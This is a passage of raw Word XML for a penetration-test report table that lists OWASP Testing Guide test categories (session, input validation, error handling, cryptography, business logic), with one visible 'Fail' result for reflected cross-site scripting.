            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="28CD0103"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Cross Site Request Forgery (CSRF) (OTG-SESS-005)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="5BAC8716"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750486D8"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6A865795" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3EDACEF6"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Logout Functionality (OTG-SESS-006)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="6B42996B"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0360EEEB"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9B5F8BD" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="651456A1"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 Session Timeout (OTG-SESS-007)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="584C54E0"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72935E1F"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38BA632C" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="617B527E"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Session Puzzling (OTG-SESS-008)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="53189EDD"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B133F3" w14:paraId="260FDAC2" w14:textId="77777777" w:rsidTr="0001157D">
        <w:trPr>
          <w:trHeight w:val="489"/>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A8EC34D" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AD7173">
              <w:t>Input Validation Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="71E71425" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00271CFB" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00271CFB">
              <w:rPr>
                <w:bCs/>
              </w:rPr>
              <w:t>Testing for Reflected Cross Site Scripting (OTG-INPVAL-001)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="48FCD1F7" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00B133F3" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00271CFB">
              <w:rPr>
                <w:b/>
                <w:color w:val="FF0000"/>
              </w:rPr>
              <w:t>Fail</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0001157D" w:rsidRPr="00AD7173" w14:paraId="70AF2598"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947F8C7" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="691FBBE3"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Stored Cross Site Scripting (OTG-INPVAL-002)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="0177EC41"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7B584C" w:rsidRPr="00AD7173" w14:paraId="3063F1BD"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0A4229F7" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="27509D68"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HTTP Verb Tampering (OTG-INPVAL-003)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="5AB36CDB"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16725BE5"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053DB3E2" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2B2A9EDF"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HTTP Parameter Pollution (OTG-INPVAL-004)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="1D1DAC94"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16A73BD3"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3C3C2786" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6AC51685"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SQL Injection (OTG-INPVAL-005)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="25FDDA2A"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4DEB3ECB"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28AEDAD5" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="570DD44D"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Oracle Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="48966D48"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095FE4BE"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54D4D134" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="036AA178"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MySQL Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="2CC12973"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48CFD3F1"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3ED6F6D5" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="57C830DB"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SQL Server Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="3607157B"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47D494D3"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6802B098" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4A3DB493"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PostgreSQL (from OWASP BSP)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="3C4540D2"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26E92BED"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15E4901" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="592389D9"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MS Access Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="436C258B"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2F8FD3E7"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5A46E230" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6C602307"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NoSQL injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="3F2CAA58"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64F4D78B"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3BC107E8" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="77591197"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LDAP Injection (OTG-INPVAL-006)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="2F04C48B"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5E988BC6"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1FFDE18A" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="69C23024"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ORM Injection (OTG-INPVAL-007)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="59BDBA15"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70AA699F"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1D370419" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="62A4EC66"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XML Injection (OTG-INPVAL-008)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="6C0E0388"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77720259"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54A2E448" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="081C912D"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SSI Injection (OTG-INPVAL-009)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="4AFA17DB"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2ED403EB"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6BD10FB5" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4E548ADD"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XPath Injection (OTG-INPVAL-010)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="1C6020B8"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7A6AA465"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16A71661" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="23125012"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IMAP/SMTP Injection (OTG-INPVAL-011)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="10968B4C"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31C2CA07"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6831A2F6" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5345A357"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Code Injection (OTG-INPVAL-012)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="319810A1"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59BFEBCC"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18CD4AB5" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="16B7C544"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Local File Inclusion</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="23178E6F"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36034C10"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32C5E925" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6D8E09D4"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Remote File Inclusion</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="7D1BFE9A"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1F44588E"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3789CDDE" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3CAB7F23"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Command Injection (OTG-INPVAL-013)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="1A39321E"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12437142"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1C060725" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2E4CDBD4"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Buffer overflow (OTG-INPVAL-014)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="559A0F22"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28D8151D"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05CA5A7" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3D4BC5BE"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Heap overflow</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="1EEDEE34"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374445B1"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04AEB34F" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3D2192E6"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Stack overflow</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="4C0D5A0B"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414D0931"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51326E24" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="16B848ED"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Format string</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="36D26A84"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2F8A8C70"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3668254" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4EA2AF13"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Incubated Vulnerabilities (OTG-INPVAL-015)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="52234E95"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5387A49B"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713A6426" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6821003C"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HTTP Splitting/Smuggling (OTG-INPVAL-016)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="5512F681"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6E86F85C"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15C29DCF" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="662CDD52"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HTTP Incoming Requests (OTG-INPVAL-017)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="62338BCC"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559EE506"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AF2C6CD" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AD7173">
              <w:t>Testing for Error Handling</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5EC1772B"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Analysis of Error Codes (OTG-ERR-001)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="3F059E83"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66A5FD36"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BC5046D" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="60479CFE"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Analysis of Stack Traces (OTG-ERR-002)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="365E9C7B"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17D470E7"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8EFFB5A" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AD7173">
              <w:t>Testing for Weak Cryptography</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="798A7366"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Weak SSL/TLS Ciphers, Insufficient Transport Layer Protection (OTG-CRYPST-001)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="4F7A09BD"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4968BD3F"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BFC0E35" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1FB9DB40"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Padding Oracle (OTG-CRYPST-002)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="381CF17B"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5D02F78A"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5230F141" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3AA41C83"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Sensitive Information Sent via Unencrypted Channels (OTG-CRYPST-003)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="44E69585"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2D254734"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5DF5C5F" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AD7173">
              <w:t>Business Logic Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="74E79049"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 Business Logic Data Validation (OTG-BUSLOGIC-001)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="7297304F"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1179D00B"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0A295D27" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6FE74AAD"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 Ability to Forge Requests (OTG-BUSLOGIC-002)</w:t>
            </w:r>
          </w:p>
        </w:tc>
